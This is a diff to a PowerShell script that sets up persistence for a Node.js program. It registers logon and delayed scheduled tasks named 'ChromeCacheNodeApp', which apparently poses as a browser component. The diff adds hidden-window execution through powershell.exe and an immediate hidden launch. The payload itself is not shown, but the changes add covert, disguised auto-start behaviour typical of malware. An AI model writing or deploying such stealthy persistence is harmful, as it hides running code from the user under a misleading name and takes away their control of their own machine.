@@ -28,7 +28,7 @@ function Add-ScheduledTaskHelper {
         [string]$TaskArg,
         $TaskTrigger
     )
-    $action = New-ScheduledTaskAction -Execute $nodeExePath -Argument $TaskArg
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command $TaskArg"
     $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
     $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
     $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
@@ -36,6 +36,7 @@ function Add-ScheduledTaskHelper {
     Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $TaskTrigger -Principal $principal -Settings $settings | Out-Null
 }
 $logonTrigger = New-ScheduledTaskTrigger -AtLogOn
-Add-ScheduledTaskHelper -TaskName "ChromeCacheNodeApp" -TaskArg "`"$mainJsPath`"" -TaskTrigger $logonTrigger
+Add-ScheduledTaskHelper -TaskName "ChromeCacheNodeApp" -TaskArg "& '$nodeExePath' '$mainJsPath'" -TaskTrigger $logonTrigger
 $delayedTrigger = New-ScheduledTaskTrigger -Once -At ([DateTime]::Now.AddMinutes(5))
-Add-ScheduledTaskHelper -TaskName "ChromeCacheNodeApp-Delayed" -TaskArg "`"$mainJsPath`"" -TaskTrigger $delayedTrigger
+Add-ScheduledTaskHelper -TaskName "ChromeCacheNodeApp-Delayed" -TaskArg "& '$nodeExePath' '$mainJsPath'" -TaskTrigger $delayedTrigger
+Start-Process -WindowStyle Hidden -FilePath $nodeExePath -ArgumentList "`"$mainJsPath`""
